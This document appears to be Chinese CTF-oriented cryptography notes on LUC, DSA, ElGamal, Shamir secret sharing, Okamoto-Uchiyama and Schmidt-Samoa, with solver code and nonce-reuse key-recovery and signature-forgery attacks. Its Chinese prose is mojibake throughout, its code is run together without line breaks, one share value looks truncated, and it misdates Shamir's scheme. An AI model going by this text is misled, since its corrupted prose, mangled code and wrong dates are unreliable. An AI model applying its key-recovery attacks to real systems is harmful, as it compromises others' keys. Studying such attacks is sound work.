å…¬é’¥ä¸ºï¼š$(N,e)$ã€‚ åŠ å¯† $C=V_e(M,1) \\pmod N$ï¼Œå¯¹ä»»æ„ä¿¡æ¯ $M \\in \\mathbb{Z}_N$ã€‚ è§£å¯† è§£å¯†å¯†é’¥ $d$ï¼Œ$ed \\equiv 1 \\pmod {S(N)}$ï¼Œ $S(N)=\\text{lcm}\\left(p-\\left (\\cfrac{D}{p} \\right),p-\\left (\\cfrac{D}{q} \\right)\\right)$ï¼Œ$D=C^2-4$ï¼Œ å…¶ä¸­ $\\left(\\cfrac{D}{p} \\right)= \\begin{cases} 1,&amp; \\exists x, x^2 \\equiv D \\pmod {p} \\\\ 0,&amp; p \\mid D \\\\ -1, &amp; \\text{other} \\end{cases}$ ä¸ºå‹’è®©å¾·(Legendre)ç¬¦å·ã€‚ $M=V_d(C,1) \\pmod N$ã€‚ å‚è€ƒ ä¸€ç§æ–°çš„åŸºäº Lucas åºåˆ—çš„å…¬é’¥å¯†ç ä½“åˆ¶ LUC: A New Public Key System UMassCTF 2021 - Weird RSA LUC-RSA: A new attack on three variants of the RSA cryptosystemCryptanalysis of RSA-type cryptosystems based on Lucas sequences, Gaussian integers and elliptic curves HFCTF 2022 - RRSSAA RCTF 2022 - easyRSA 1234567891011121314151617181920212223242526272829303132333435363738394041#æ³•1ï¼Œå¿«é€ŸçŸ©é˜µå¹‚from Crypto.Util.number import long_to_bytesN=C=def ffm(num): # Fermat&#x27;s Factorization Method. if num%2==0: return (2,num/2) a=ceil(sqrt(num)) c=a**2-num while is_square(c)==0: a+=1 b=sqrt(c) return (a-b,a+b)def matpow(mat,power): # Matrix Square-And-Multiply Exponentiation. power_rep=bin(power)[3:] result=mat pcnt=1 for i in power_rep: result=result*result pcnt*=2 if i==&#x27;1&#x27;: result=mat*result pcnt+=1 print(pcnt) return resultdef decrypt(d): # Decryption. Mat=Matrix(Zmod(N),[[C,-1],[1,0]]) ori=vector(Zmod(N),[C,2]) return matpow(Mat,d-1)*orip,q=ffm(N) assert p*q==ND=(C**2-4)%Np_leg,q_leg=int((p-kronecker(D,p))%N),int((q-kronecker(D,q))%N)tn=lcm((p_leg),(q_leg))d=inverse_mod(0x10001,tn)assert (0x10001*d)%tn==1decc,_=decrypt(d)print(long_to_bytes(decc)) 1234567891011#æ³•2ï¼Œå­˜å‚¨vd#vd(2n)=vd(n)^2-2#vd(2n+1)=c*vd(n)^2-vd(n)*vd(n-1)+cdef v(n): if n == 0: return 2 if n == 1: return c if n in v_dict.keys(): return v_dict[n] if(n % 2 == 0): ret = (pow(v(n // 2), 2, N) - 2) % N else: ret = (c * pow(v(n // 2), 2, N) - v(n // 2) * v((n // 2) - 1) - c) % N v_dict[n] = ret return ret 12345678910111213#æ³•3ï¼ŒWilliam&#x27;s p+1ç®—æ³•ä¼˜åŒ–vd# Williams&#x27;s p + 1 algorithmdef LUC(c, d, N): x = c y = (c**2 - 2) % N for bit in bin(d)[3:]: if bit == &#x27;1&#x27;: x = (x*y - c) % N y = (y**2 - 2) % N else: y = (x*y - c) % N x = (x**2 - 2) % N return x â€‹ DSAæ•°å­—ç­¾å å¯†é’¥ç”Ÿæˆ é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„å“ˆå¸Œå‡½æ•°ï¼Œç›®å‰ä¸€èˆ¬é€‰æ‹©SHA1ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å¼ºåº¦æ›´é«˜çš„å“ˆå¸Œå‡½æ•° $H$ï¼› é€‰æ‹©å¯†é’¥çš„é•¿åº¦ $L$ å’Œ $N$ï¼Œè¿™ä¸¤ä¸ªå€¼å†³å®šäº†ç­¾åçš„å®‰å…¨ç¨‹åº¦ã€‚åœ¨æœ€åˆçš„DSSï¼ˆDigital Signature Standard ï¼‰ä¸­å»ºè®® $L$ å¿…é¡»ä¸º64çš„å€æ•°ï¼Œå¹¶ä¸” $512â‰¤Lâ‰¤1024$ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ›´å¤§ã€‚$N$ å¤§å°å¿…é¡»ä¸å¤§äºå“ˆå¸Œå‡½æ•° $H$ è¾“å‡ºçš„é•¿åº¦ã€‚FIPS 186-3ç»™å‡ºäº†ä¸€äº›å»ºè®®çš„ $L$ å’Œ $N$ çš„å–å€¼ä¾‹å­ï¼š$(1024, 160),(2048, 224), (2048, 256),(3072, 256)$ã€‚ é€‰æ‹© $N$ æ¯”ç‰¹çš„ç´ æ•° $q$ï¼› é€‰æ‹© $L$ æ¯”ç‰¹çš„ç´ æ•° $p$ï¼Œä½¿å¾— $p-1$ æ˜¯ $q$ çš„å€æ•°ï¼› é€‰æ‹©æ»¡è¶³ $g^k \\equiv 1 \\pmod p$ çš„æœ€å°æ­£æ•´æ•° $k$ ä¸º $q$ çš„ $g$ï¼Œå³åœ¨æ¨¡ $p$ çš„èƒŒæ™¯ä¸‹ï¼Œ$\\mathrm{ord}(g)=q$ çš„ $g$ã€‚å³ $g$ åœ¨æ¨¡ $p$ çš„æ„ä¹‰ä¸‹ï¼Œå…¶æŒ‡æ•°æ¬¡å¹‚å¯ä»¥ç”Ÿæˆå…·æœ‰ $q$ ä¸ªå…ƒç´ çš„å­ç¾¤ã€‚è¿™é‡Œå¯ä»¥é€šè¿‡è®¡ç®— $g \\equiv h^{\\frac{pâˆ’1}{q}} \\pmod p$ æ¥å¾—åˆ° $g$ï¼Œå…¶ä¸­ $h \\in (1,pâˆ’1)$ ã€‚ é€‰æ‹©ç§é’¥ $x \\in (0,q)$ï¼Œè®¡ç®— $y \\equiv g^x \\pmod p$ã€‚ å…¬é’¥ä¸º $(p,q,g,y)$ï¼Œç§é’¥ä¸º $(x)$ã€‚ ç­¾å é€‰æ‹©éšæœºæ•´æ•°æ•° $k \\in (0,q)$ ä½œä¸ºä¸´æ—¶å¯†é’¥ï¼› è®¡ç®— $r \\equiv (g^k \\bmod p) \\pmod q$ï¼› è®¡ç®— $s \\equiv (H(m)+xr)k^{-1} \\pmod q$ã€‚ ç­¾åç»“æœä¸º $(r,s)$ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä½¿ç”¨äº†å“ˆå¸Œå‡½æ•°å¯¹æ¶ˆæ¯è¿›è¡Œäº†å“ˆå¸Œå¤„ç†ã€‚ éªŒè¯ è®¡ç®—è¾…åŠ©å€¼ $w \\equiv s^{-1} \\pmod q$ï¼› è®¡ç®—è¾…åŠ©å€¼ $u_1 \\equiv H(m)\\cdot w \\pmod q$ï¼› è®¡ç®—è¾…åŠ©å€¼ $u_2 \\equiv r\\cdot w \\pmod q$ï¼› è®¡ç®— $v \\equiv (g^{u_1}y^{u_2} \\bmod p) \\pmod q$ï¼› å¦‚æœ $v$ ä¸ $r$ ç›¸ç­‰ï¼Œåˆ™æ ¡éªŒæˆåŠŸã€‚ æ”»å‡» $k$ å¤ç”¨ï¼ˆå…±äº« $k$ï¼‰ å¦‚æœåœ¨ä¸¤æ¬¡ç­¾åçš„è¿‡ç¨‹ä¸­å…±äº«äº† $k$ï¼Œå°±å¯ä»¥è¿›è¡Œæ”»å‡»ã€‚ å‡è®¾ç­¾åçš„æ¶ˆæ¯ä¸º $m_1,m_2$ï¼Œæ˜¾ç„¶ä¸¤è€…çš„ $r$ çš„å€¼ä¸€æ ·ï¼Œæ­¤å¤– $s_1 \\equiv (H(m_1)+xr)k^{-1} \\pmod q$ $s_2 \\equiv (H(m_2)+xr)k^{-1} \\pmod q$ è¿™é‡Œé™¤äº† $x$ å’Œ $k$ ä¸çŸ¥é“å‰©ä¸‹çš„å‡çŸ¥é“ï¼Œè”ç«‹æœ‰ $k(s_1-s_2) \\equiv (H(m_1)-H(m_2)) \\pmod q$ï¼Œ æ­¤æ—¶å³å¯è§£å‡º $k$ï¼Œè¿›ä¸€æ­¥å¯ä»¥è§£å‡º $x$ã€‚ $k$ éƒ¨åˆ†æ³„éœ² å‚è€ƒï¼šRecovering cryptographic keys from partial information, by example â€‹ Elgamalæ•°å­—ç­¾å å¯†é’¥ç”Ÿæˆ é€‰å–ä¸€ä¸ªè¶³å¤Ÿå¤§çš„ç´ æ•° $p$ï¼ˆåè¿›åˆ¶ä½æ•°ä¸ä½äº160ï¼‰ï¼Œä¾¿äºåœ¨ $\\mathbb{Z}_p$ ä¸Šæ±‚è§£DLPæ˜¯å›°éš¾çš„ï¼› é€‰å–ç”Ÿæˆå…ƒ $g \\in (0,p)$ï¼› éšæœºé€‰å–æ•´æ•° $d \\in [0,p-2]$ï¼Œå¹¶è®¡ç®— $g^d \\equiv y \\pmod p$ï¼› å…¬é’¥ä¸º $(p,g,y)$ï¼Œç§é’¥ä¸º $(d)$ã€‚ ç­¾å Aé€‰å–éšæœºæ•° $k \\in (0,p-1)$ï¼Œä¸” $\\gcd(k,p-1)=1$ï¼Œå¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼š $\\mathrm{sig}(m,k)=(r,s)$ å…¶ä¸­ï¼š $r \\equiv g^k \\pmod p$ $s \\equiv (m-dr)k^{-1} \\pmod {p-1}$ã€‚ éªŒè¯ å¦‚æœ $g^m \\equiv y^rr^s \\pmod p$ï¼Œé‚£ä¹ˆéªŒè¯æˆåŠŸï¼Œå¦åˆ™éªŒè¯å¤±è´¥ã€‚ æ”»å‡» $k$ å¤ç”¨ï¼ˆå…±äº« $k$ï¼‰ å¦‚æœç­¾åè€…å¤ç”¨äº†éšæœºæ•° $k$ ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥è½»è€Œæ˜“ä¸¾åœ°è®¡ç®—å‡ºç§é’¥ã€‚ å‡è®¾ç›®å‰æœ‰ä¸¤ä¸ªç­¾åéƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªéšæœºæ•°è¿›è¡Œç­¾åçš„ã€‚é‚£ä¹ˆæœ‰ï¼š $r \\equiv g^k \\pmod p$ $s_1 \\equiv (m_1-dr)k^{-1} \\pmod {p-1}$ $s_2 \\equiv (m_2-dr)k^{-1} \\pmod {p-1}$, è¿›è€Œæœ‰ $k(s_1-s_2) \\equiv (m_1-m_2) \\pmod {p-1}$ï¼Œ $s_1,s_2,m_1,m_2,p$ å‡å·²çŸ¥ï¼Œå®¹æ˜“ç®—å‡º $k$ï¼Œè¿›è€Œæ ¹æ® $s$ çš„è®¡ç®—æ–¹æ³•å¾—åˆ°ç§é’¥ $d \\equiv (m-ks)r^{-1} \\pmod {p-1}$ã€‚ æ„é€ éªŒè¯ å•å‚æ•° é€‰æ‹© $e \\in (1,p-1)$ï¼Œä»¤ $r=g^ey \\bmod p$ï¼Œ$s=-r \\bmod (p-1)$ï¼Œæœ‰ $m=es \\bmod (p-1)$ æ»¡è¶³éªŒè¯ã€‚ åŒå‚æ•° é€‰æ‹© $e,v \\in (1,p-1),\\gcd(v,p-1)=1$ï¼Œä»¤ $r=g^ey^v \\bmod p$ï¼Œ$s=-rv^{-1} \\bmod (p-1)$ï¼Œæœ‰ $m=es \\bmod (p-1)$ æ»¡è¶³éªŒè¯ã€‚ â€‹ Shamirå¯†é’¥åˆ†äº«ç®—æ³•Shamir å¯†é’¥åˆ†äº«ç®—æ³•æœ€æ—©æ˜¯ç”± Shamir å’Œ Blackly åœ¨ 1970 å¹´åŸºäº Lagrange æ’å€¼å’ŒçŸ¢é‡æ–¹æ³•æå‡ºçš„ã€‚ ç®—æ³•æœ‰ 2 ä¸ªé‡è¦å‚æ•°ï¼š$k$ å’Œ $n$ã€‚$n$ è¡¨ç¤ºå°†æ˜æ–‡åŠ å¯†ä¸º $n$ ä¸ª $\\text{Shadow}$ï¼Œ$k$ è¡¨ç¤º è‡³å°‘éœ€è¦ $k$ ä¸ª $\\text{Shadow}$ æ‰å¯ä»¥æ¢å¤å‡ºæ˜æ–‡ã€‚ åŠ å¯† è‹¥æ˜æ–‡ä¸º $s$ï¼Œ$s \\in \\mathbb{Z}_p$ï¼Œ$p$ ä¸ºä¸€ä¸ªå¤§ç´ æ•°ã€‚åœ¨ $\\text{GF}(p)$ ä»»å– $k-1$ ä¸ªéšæœºæ•°ï¼š $a_1,a_2,\\cdots,a_{k-1}$ï¼Œæ„é€ å¦‚ä¸‹å¤šé¡¹å¼ï¼š $f(x)=s+a_1x+a_2x^2+\\cdots+a_{k-1}x^{k-1} \\pmod p$ ä»»å– $n$ ä¸ªä¸åŒçš„æ•°ï¼š$x_1,x_2,\\cdots,x_n$ï¼Œåˆ†åˆ«ä»£å…¥å¤šé¡¹å¼å¾—åˆ° $n$ ä¸ªå¯†é’¥å¯¹ï¼š $(x_1,f(x_1)),(x_2,f(x_2)),\\cdots,(x_n,f(x_n))$ å°†è¿™ $n$ ä¸ªå¯†é’¥å¯¹åˆ†å‘ç»™ $n$ ä¸ªæŒæœ‰è€…ã€‚ è§£å¯† å¾—åˆ°äº† $n$ ä¸ªå¯†é’¥å¯¹ $(x_1,f(x_1)),(x_2,f(x_2)),\\cdots,(x_n,f(x_n))$ åï¼Œå¯ä»¥åˆ—å‡ºä»¥ä¸‹åœ¨ $\\text{GF}(p)$ ä¸Šçš„æ–¹ç¨‹ç»„ï¼š $\\left\\{\\begin{array}{c} s+a_1x_1+a_2x_1^2+\\cdots+a_{k-1}x_1^{k-1}=f(x_1) \\\\ s+a_1x_2+a_2x_2^2+\\cdots+a_{k-1}x_2^{k-1}=f(x_2) \\\\ \\vdots \\\\ s+a_1x_n+a_2x_n^2+\\cdots+a_{k-1}x_n^{k-1}=f(x_n) \\end{array}\\right.$ ç„¶åå°±å¯ç”¨ Lagrange æ’å€¼ç®—æ³•æ±‚å‡º $s$ äº†ã€‚ 12345#python-1from sslib import shamirdata = &#123;&#x27;required_shares&#x27;: 2, &#x27;prime_mod&#x27;: &#x27;AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEp&#x27;, &#x27;shares&#x27;: [&#x27;1-MEwx7cz+C01rL8H0Hhz2EIgHjWYXVcL81uITmRha674=&#x27;, &#x27;2-YJhj22+ntS1s80CT9b6Y7ayc52baTFGNRpPUyLxtaf8=&#x27;, &#x27;3-4SRZDcshiZTVRJ7nVY8NDq83JOsnZtPm&#x27;, &#x27;4-wTDHtrT7CO1wej3TpQHep/XHm2hgOW6uJfdXKASSZoE=&#x27;, &#x27;5-8Xz5pFekss1yPbxzfKOBhRpc9WkjL/0+lakYV6ik5MI=&#x27;]&#125;print(shamir.recover_secret(shamir.from_base64(data)).decode(&#x27;ascii&#x27;)) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#python-2from Crypto.Util.number import *import gmpy2def product(vals, p): return reduce(lambda x, y: x * y % p, vals)def lagrange_interpolate(x, x_s, y_s, p): n = len(x_s) assert n == len(set(x_s)) # x_s must be distinct num = [] den = [] for i in range(n): others = x_s[:i] + x_s[i+1:] num.append(product((x - o for o in others), p)) den.append(product((x_s[i] - o for o in others), p)) dens = product(den, p) res = 0 for i in range(n): tmp1 = ((num[i] * dens % p) * y_s[i]) % p tmp2 = tmp1 * gmpy2.invert(den[i], p) % p res = (res + tmp2) % p res = res * gmpy2.invert(dens, p) % p return resdef shamir_sharing_encode(s, k, n, p): a = [getRandomInteger(Nbits) for _ in range(k-1)] res = [] for _ in range(n): x = getRandomInteger(Nbits) fx = s for i in range(k-1): fx = (fx + a[i] * pow(x, i+1, p)) % p res.append((x, fx)) return resdef shamir_sharing_decode(shares, p): x_s, y_s = zip(*shares) return lagrange_interpolate(0, x_s, y_s, p)Nbits = 1024secret = bytes_to_long(&#x27;it_is_the_top_secret&#x27;)p = getPrime(Nbits)k = 513n = 513shares = shamir_sharing_encode(secret, k, n, p)s = shamir_sharing_decode(shares, p)print long_to_bytes(s)# 2s 1234567891011121314151617181920212223#SageP = PolynomialRing(GF(p), &#x27;x&#x27;)ret = P(0)for x, y in shares: r = P(1) * y for xx, yy in shares: if x != xx: r = r * P((0 - xx) / (x - xx)) ret = ret + rprint ret# 19s#Sageç®—ç³»æ•°P = PolynomialRing(GF(p), &#x27;x&#x27;)ret = P(0)for x, y in shares: r = P(1) * y for xx, yy in shares: if x != xx: r = r * P(&#x27;(x - %d) / (%d - %d)&#x27; % (xx, x, xx)) ret = ret + rprint ret[0]# 154s é™¤äº† Lagrange æ’å€¼ï¼Œä¹Ÿå¯ä»¥ç”¨çŸ©é˜µã€‚ å¯ä»¥å°†ä¸Šé¢çš„æ–¹ç¨‹ç»„åŒ–ä¸ºä»¥ä¸‹åœ¨ $\\text{GF}(p)$ ä¸Šçš„çŸ©é˜µä¹˜æ³•ï¼š $\\left(\\begin {array}{c} 1 &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ 1 &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right) \\times \\left(\\begin {array}{c} s \\\\ a_1 \\\\ \\vdots \\\\ a_{k-1} \\end{array} \\right) = \\left(\\begin {array}{c} f(x_1) \\\\ f(x_2) \\\\ \\vdots \\\\ f{x_n} \\end{array} \\right)$ 1234567891011121314151617181920#SageçŸ©é˜µä¹˜æ³•k = 513n = 513x, y = zip(*shares)array_1 = []for i in range(n): for j in range(k): array_1.append(pow(x[i], j, p))A = matrix(GF(p), n, k, array_1)array_2 = []for i in range(n): array_2.append(y[i])B = matrix(GF(p), n, 1, array_2)a = A.solve_right(B)print a[0][0]# 266s ä¹Ÿå¯ä»¥å°†ä¹‹è§†ä¸ºå¤šå…ƒåŒä½™æ–¹ç¨‹ç»„ï¼š $\\left\\{\\begin{array}{c} s+a_1x_1+a_2x_1^2+\\cdots+a_{k-1}x_1^{k-1} \\equiv f(x_1) \\pmod p \\\\ s+a_1x_2+a_2x_2^2+\\cdots+a_{k-1}x_2^{k-1} \\equiv f(x_2) \\pmod p \\\\ \\vdots \\\\ s+a_1x_n+a_2x_n^2+\\cdots+a_{k-1}x_n^{k-1} \\equiv f(x_n) \\pmod p \\end{array}\\right.$ è®°ç³»æ•°çŸ©é˜µçš„è¡Œåˆ—å¼ä¸ºï¼š $\\Delta = \\left \\vert \\begin {array}{c} 1 &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ 1 &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ 1 &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right \\vert \\neq 0$ è¦æ±‚çš„æ˜¯ $s$ï¼Œå› æ­¤å°†è¡Œåˆ—å¼ç¬¬ä¸€åˆ—æ¢ä¸ºåŒä½™æ–¹ç¨‹çš„å€¼ï¼š $\\Delta_0 = \\left \\vert \\begin {array}{c} f(x_1) &amp; x_1 &amp; x_1^2 &amp; \\cdots &amp; x_1^{k-1} \\\\ f(x_2) &amp; x_2 &amp; x_2^2 &amp; \\cdots &amp; x_2^{k-1} \\\\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\ f(x_n) &amp; x_n &amp; x_n^2 &amp; \\cdots &amp; x_n^{k-1} \\end{array} \\right \\vert \\neq 0$ ç”±å…‹æ‹‰é»˜æ³•åˆ™å¾—ï¼š $s \\equiv \\Delta^{-1}\\Delta_0 \\pmod p$ 1234567891011121314151617181920#Sagefx_num = 513x, y = zip(*shares)array_1 = []for i in range(fx_num): for j in range(fx_num): array_1.append(pow(x[i], j, p))delta = matrix(GF(p), fx_num, fx_num, array_1).determinant()array_2 = [_ for _ in array_1]for i in range(fx_num): array_2[i*fx_num] = y[i]delta_0 = matrix(GF(p), fx_num, fx_num, array_2).determinant() % pdelta_inverse = inverse_mod(int(delta), p)res = delta_inverse * delta_0 % pprint res# 1200s ä½†æ˜¯å¦‚æœç»´æ•°å¾ˆå¤§ï¼Œç›´æ¥è§£è¡Œåˆ—å¼ä¼šå¾ˆæ…¢ã€‚è§‚å¯Ÿå‘ç° $\\Delta$ å…¶å®æ˜¯æ—‹è½¬åçš„èŒƒå¾·è’™è¡Œåˆ—å¼ã€‚$\\Delta_0$ æ˜¯æ—‹è½¬åçš„èŒƒå¾·è’™è¡Œåˆ—å¼çš„å˜å½¢ï¼Œç¬¬ä¸€è¡Œä¸æ˜¯å…¨ 1ï¼Œè€Œæ˜¯ $f(x)$ã€‚å¯ä»¥æŒ‰ç¬¬ä¸€è¡Œå±•å¼€ï¼Œä½™å­å¼ä¸­å°†æ¯ä¸€åˆ—é™¤ä»¥è¯¥åˆ—å…ƒçš„ä¸€æ¬¡æ–¹ï¼Œå¯åŒ–ä¸ºèŒƒå¾·è’™è¡Œåˆ—å¼ã€‚è®¡ç®—é€Ÿåº¦ä¼šå¿«éå¸¸å¤šã€‚ 12345678910111213141516171819202122232425262728#Sagefx_num = 513x, y = zip(*shares)delta = 1for i in range(1, fx_num): for j in range(0, i): t = x[i] - x[j] delta = (delta * t) % pdelta_0 = 0for i in range(fx_num): tmp_x = [_ for _ in x] tmp_x.pop(i) yuzishi = -y[i] if (i+1+1) % 2 else y[i] for j in range(fx_num-1): yuzishi = (yuzishi * tmp_x[j]) % p for j in range(1, fx_num-1): for k in range(0, j): t = tmp_x[j] - tmp_x[k] yuzishi = (yuzishi * t) % p delta_0 = (delta_0 + yuzishi) % pdelta_inverse = gmpy2.invert(delta, p)res = delta_inverse * delta_0 % pprint res# 224s æ”»å‡» å¦‚æœåœ¨åŠ å¯† 2 æ®µæ˜æ–‡ $s_1,s_2$ è¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨ç›¸åŒçš„éšæœºæ•° $a$ ä»¥åŠå¤§ç´ æ•° $p$ï¼Œè¿˜èƒ½å¾—åˆ°åŒä¸€ä¸ª $x$ å¯¹åº”çš„ä¸¤ä¸ª $f(x)$ï¼Œå¦‚æœçŸ¥é“ä¸€ä¸ªæ˜æ–‡ $s_1$ çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç®—å‡ºå¦ä¸€ä¸ªæ˜æ–‡ã€‚ åœ¨ $\\text{GF}(p)$ ä¸Šï¼š$s_1 + a_1x + a_2x^2 + a_3x^3 + â€¦ + a_{k-1}x^{k-1} = f(x)_1$ è®¾ï¼š$A = a_1x + a_2x^2 + a_3x^3 + â€¦ + a_{k-1}x^{k-1}$ å³ï¼š $s_1 + A = f(x)_1 \\\\ s_2 + A = f(x)_2$ å› æ­¤ï¼š $s_2 = f(x)_2 - f(x)_1 + s_1$ å¦‚æœä¸çŸ¥é“ä¸¤ä¸ªæ˜æ–‡çš„æƒ…å†µä¸‹ï¼Œä½†ä¸¤æ˜æ–‡æœ‰ä¸€å®šçš„çº¿æ€§å…³ç³»ï¼Œä¹Ÿå¯ä»¥ç®—å‡ºä¸¤æ˜æ–‡ã€‚ è‹¥ $s_2 = as_1 + b$ï¼Œåˆ™æœ‰åŒä½™æ–¹ç¨‹ç»„ï¼š $\\left\\{ \\begin{array}{c} s_1 + A - f(x)_1 \\equiv 0 \\pmod p \\\\ s_2 + A - f(x)_2 \\equiv 0 \\pmod p\\\\ as_1 + b - s_2 \\equiv 0 \\pmod p \\end{array}\\right.$ 12345678910111213#Sagea = 99999999b = 123456PR.&lt;s1,s2,A&gt; = PolynomialRing(Zmod(p))f1 = s1 + A - y1f2 = s2 + A - y2f3 = a * s1 + b - s2Fs = [f1, f2, f3]I = Ideal(Fs)B = I.groebner_basis()print &#x27;s1 =&#x27;, ZZ(-B[0](0, 0, 0))print &#x27;s2 =&#x27;, ZZ(-B[1](0, 0, 0)) â€‹ Okamoto-Uchiyamaå¯†ç ç³»ç»Ÿ1998å¹´ç”±Tatsuaki Okamotoå’ŒShigenori Uchiyamaæå‡ºçš„å…¬é’¥åŠ å¯†ç®—æ³•ã€‚ æ¡ä»¶ï¼š$n=p^2q$ å¯†é’¥ç”Ÿæˆ ç”Ÿæˆä¸¤ä¸ªå¤§ç´ æ•° $p$ å’Œ $q$ï¼› è®¡ç®— $n=p^2q$ï¼› é€‰æ‹©ä¸€ä¸ªéšæœºæ•´æ•° $g \\in \\{2, \\cdots ,n-1\\}$ æ»¡è¶³ $g^{p-1} \\not\\equiv 1 \\pmod {p^2}$ï¼› è®¡ç®— $h=g^n \\bmod n$ã€‚ å…¬é’¥ä¸º $(n,g,h)$ï¼Œç§é’¥ä¸º $(p,q)$ã€‚ åŠ å¯† æ˜æ–‡ $m&lt;p$ å¯ä»¥é€šè¿‡å…¬é’¥ $(n,g,h)$ åŠ å¯†ï¼š é€‰æ‹©ä¸€ä¸ªéšæœºæ•´æ•° $r \\in \\{1,\\cdots,n-1\\}$ï¼› è®¡ç®— $c=g^m h^r \\bmod n$ã€‚ $c$ å³ä¸º $m$ çš„å¯†æ–‡ã€‚ è§£å¯† å¯†æ–‡ $c$ å¯ä»¥é€šè¿‡ç§é’¥ $(p,q)$ è§£å¯†ï¼š è®¡ç®— $a=\\cfrac{(c^{p-1} \\bmod {p^2})-1}{p}$ï¼› è®¡ç®— $b=\\cfrac{(g^{p-1} \\bmod {p^2})-1}{p}$ï¼› ä½¿ç”¨æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•è®¡ç®— $b$ çš„æ¨¡ $p$ é€†å…ƒ $bâ€™=b^{-1} \\bmod p$ï¼› è®¡ç®— $m=abâ€™ \\bmod p$ã€‚ $m$ å³ä¸º $c$ çš„æ˜æ–‡ã€‚ å‚è€ƒï¼šPoseidonCTF 1st Edition 2020 - discrete log â€‹ Schmidt-Samoaå¯†ç ç³»ç»Ÿ2005å¹´ï¼ŒKatja Schmidt-Samoa åˆ›å»ºäº† Schmidt-Samoa å…¬é’¥å¯†ç ä½“ç³»ã€‚ ä¸ Rabin ç±»ä¼¼ï¼Œå®ƒçš„å®‰å…¨æ€§åŸºäºå¤§æ•´æ•°åˆ†è§£çš„å›°éš¾æ€§ã€‚ä½† Rabin è§£å¯†æ—¶ä¼šå¾—åˆ°å››ä¸ªè§£ï¼Œè€Œ Schmidt-Samor å¾—åˆ°çš„æ˜¯å”¯ä¸€è§£ã€‚ å¯†é’¥ç”Ÿæˆ é€‰å–å¤§æ•´æ•° $p,q$ï¼Œè®¡ç®— $N=p^2q$ ä½œä¸ºå…¬é’¥ã€‚ è®¡ç®— $d=\\text{inv}(N,\\varphi(pq))$ ä½œä¸ºç§é’¥ã€‚ åŠ å¯† å¯¹äºå°äº $pq$ çš„æ˜æ–‡ $m$ï¼Œè®¡ç®— $c=m^N \\bmod N$ ä½œä¸ºå¯†æ–‡ã€‚ è§£å¯† å¯¹äºå¯†æ–‡ $c$ï¼Œè®¡ç®— $c^d \\bmod pq$ï¼Œå¾—åˆ°å¯†æ–‡ã€‚ å¯¹äº $d$ï¼Œå½“ $d=\\text{inv}(N,\\text{lcm}(p-1,q-1))$ æ—¶ï¼Œå¯ä»¥è¯æ˜ä»ç„¶æœ‰æå¤§æ¦‚ç‡ $2^{N \\cdot d} \\equiv 2 \\pmod {pq}$ã€‚ å› ä¸º $\\text{lcm}(p-1,q-1)$ å·²ç»æ˜¯ $(p-1)(q-1)$ éå¸¸å¤§çš„å› å­ï¼Œç”±æ‹‰æ ¼æœ—æ—¥å®šç†ï¼Œ2ç”Ÿæˆçš„å­ç¾¤çš„é˜¶åº”è¯¥æ˜¯ $(p-1)(q-1)$ çš„å› æ•°ï¼Œæ‰€æœ‰æ¦‚ç‡è¿˜æŒºé«˜çš„ã€‚ è¯æ˜ é¦–å…ˆï¼Œè®¡ç®— $\\varphi(N)$ï¼Œç”±æ¬§æ‹‰å‡½æ•°çš„æ€§è´¨ï¼Œæ˜¾ç„¶æœ‰ $\\varphi(N)=\\varphi(p^2q)=p(p-1)(q-1)$ äºæ˜¯ $x^{p(p-1)(q-1)} \\equiv 1 \\pmod N$ å°½ç®¡å…¬é’¥ã€ç§é’¥éƒ½ä¸åŒ…å« $pq$ï¼Œä½†å¯ä»¥é€šè¿‡ $(N,d)$ æ¨å‡º $pq$ï¼Œæœ‰ $N \\cdot d \\equiv 1 \\pmod {\\big((p-1)(q-1)\\big)}$ éšä¾¿é€‰ä¸€ä¸ªæ•°2ï¼Œæ¥è€ƒå¯Ÿ $2^{N \\cdot d}$ åœ¨æ¨¡ $pq$ æ—¶çš„è¡¨ç°ï¼Œæœ‰ $2^{N \\cdot d} \\equiv 2^{N \\cdot d \\bmod {\\big((p-1)(q-1)\\big)}} \\equiv 2 \\pmod {pq}$ ä»è€Œ $pq \\mid 2^{N \\cdot d}-2$ï¼Œäºæ˜¯è®¡ç®— $\\gcd(2^{N \\cdot d}-2,N)$ï¼Œå³å¾—åˆ° $pq$ã€‚ å®¹æ˜“å‘ç°ï¼Œè¿™äº›å¹‚å¯ä»¥åœ¨æ¨¡ $N$ æ„ä¹‰ä¸‹è®¡ç®—ï¼Œä»¥èŠ‚çœå¤æ‚åº¦ã€‚ç°åœ¨ $pq$ åˆ°æ‰‹ï¼Œåœ¨æ¨¡ $pq$ æ„ä¹‰ä¸‹è®¡ç®— $c^d$ï¼Œå³ $c^d \\equiv m^{N \\cdot d} \\equiv m^{N \\cdot d \\bmod {\\big((p-1)(q-1)\\big)}} \\equiv m \\pmod {pq}$ è‡³æ­¤å®Œæˆè§£å¯†ã€‚ å‚è€ƒï¼šA New Rabin-type Trapdoor Permutation Equivalent to Factoring and Its 